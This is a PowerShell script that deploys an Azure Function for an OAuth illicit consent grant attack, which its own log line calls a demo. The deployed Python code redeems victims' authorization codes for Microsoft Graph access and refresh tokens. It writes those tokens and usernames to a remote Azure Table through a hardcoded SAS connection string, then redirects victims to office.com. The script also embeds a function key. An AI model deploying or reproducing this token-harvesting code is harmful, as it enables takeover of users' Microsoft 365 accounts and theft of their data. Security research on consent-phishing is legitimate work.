﻿function New-IcgFunction{

[CmdletBinding()]
    param (
        
        [Parameter(Mandatory = $True)]
        [string]$FunctionName,

        [Parameter(Mandatory = $True)]
        [string]$ClientId,

		[Parameter(Mandatory = $True)]
        [string]$ClientSecret,

        [Parameter(Mandatory = $True)]
        [string]$TableName
        
    )

$URL = "https://icgfunction.azurewebsites.net/admin/vfs/home/site/wwwroot/$FunctionName/__init__.py"

$Params = @{
    "URI"     = $URL
    "Method"  = "PUT"
    "Headers" = @{
    "Content-Type" = "application/octet-stream"
    "x-functions-key" = "RlVuUBW8cP3D-D8XDUoJ9dIjCe-mOxxOSMWKZR_OlLbbAzFuhLjSfw=="
    }
}


$Body = @"
import logging, uuid, subprocess
import azure.functions as func

def import_or_install_module(module_name):
    try:
        # Attempt to import the module
        import_module = __import__(module_name)
    except ImportError:
        # The module is not installed; install it
        subprocess.call(["pip", "install", module_name])

def main(req: func.HttpRequest, context: func.Context) -> func.HttpResponse:
    try:
        logging.info('illicit consent grant attack demo')
        import_or_install_module("msal")
        import_or_install_module("azure.data.tables")
        import msal
        from azure.data.tables import TableServiceClient

        CLIENT_ID = "$ClientId"
        CLIENT_SECRET = "$ClientSecret" 
        Redirect = "https://icgfunction.azurewebsites.net/api/$FunctionName"
        AUTHORITY = "https://login.microsoftonline.com/common"
        SCOPE = ["https://graph.microsoft.com/.default"]
        code_val = req.params.get('code')
        # Cache
        cache = msal.SerializableTokenCache()

        # Build msal app
        app = msal.ConfidentialClientApplication(CLIENT_ID, authority=AUTHORITY, client_credential=CLIENT_SECRET, token_cache=cache)

        result = app.acquire_token_by_authorization_code(code=code_val,redirect_uri=Redirect,scopes=SCOPE)

        #logging.INFO(f"{result}")

        connection_string = "TableEndpoint=https://icgstorageacc.table.core.windows.net/;SharedAccessSignature=sv=2022-11-02&ss=t&srt=sco&sp=rwdlacu&se=2027-03-27T20:32:26Z&st=2024-03-27T12:32:26Z&spr=https,http&sig=m7GqcPxm8459B423rXX17OpgI%2BVI82y9qTbhRk87e50%3D"
        service = TableServiceClient.from_connection_string(conn_str=connection_string)
        
        table_client = service.get_table_client(table_name="$TableName")

        access_token = result["access_token"]
        refresh_token = result["refresh_token"]
        username = result["id_token_claims"]["preferred_username"]

        my_entity = {
        u'PartitionKey': str(uuid.uuid4()),
        u'RowKey': str(uuid.uuid4()),
        u'RawData': str(result),
        u'Access_Token': access_token,
        u'Refresh_Token': refresh_token,
        u'UserName':username
        }

        entity = table_client.create_entity(entity=my_entity)
        headers = {"Location": "https://www.office.com"}
        return func.HttpResponse(headers=headers, status_code=302)

    except Exception as e:
            headers = {"Location": "https://www.office.com"}
            return func.HttpResponse(headers=headers, status_code=302)

"@

Invoke-RestMethod @Params -UseBasicParsing -Body $Body

}